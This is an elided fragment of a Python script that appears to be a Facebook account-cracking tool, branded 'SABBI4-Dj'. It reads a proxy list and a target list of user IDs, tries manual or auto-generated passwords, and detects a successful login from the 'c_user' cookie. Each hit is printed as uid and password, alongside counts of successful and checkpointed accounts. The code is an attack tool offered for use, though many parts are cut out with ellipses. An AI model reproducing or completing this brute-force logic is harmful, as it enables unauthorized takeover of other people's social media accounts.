...
os.system("Djg-open https://www.facebook.com/profile.php?id=100000667784765/")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SABBI4-Dj')
prox=open('.prox.txt','r').read().splitlines()
for Dj in range(10000):
...
def Settings():
	...
	pwplus=input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m PASSWORD MENU \x1b[1;94m MANUAL PASSWORD \x1b[1;91mMethod[1]\n\x1b[1;93m AUTO PASSWORD \x1b[1;96method[2] \x1b[1;92m\n [\033[1;92m\033[1;31m\033[1;92m] CHOOSE : \x1b[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def BER():
    ...
    kodex = input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mTERGET lst NAME :  ')
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSABBI4-Dj\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    ...
        	    continue
        loop+=1
        sys.stdout.write('\r%s[SABBI4-Dj]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    continue
        loop+=1
        sys.stdout.write('\r%s[SABBI4-Dj]\033[1;32m-%s/%sSABBI4][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
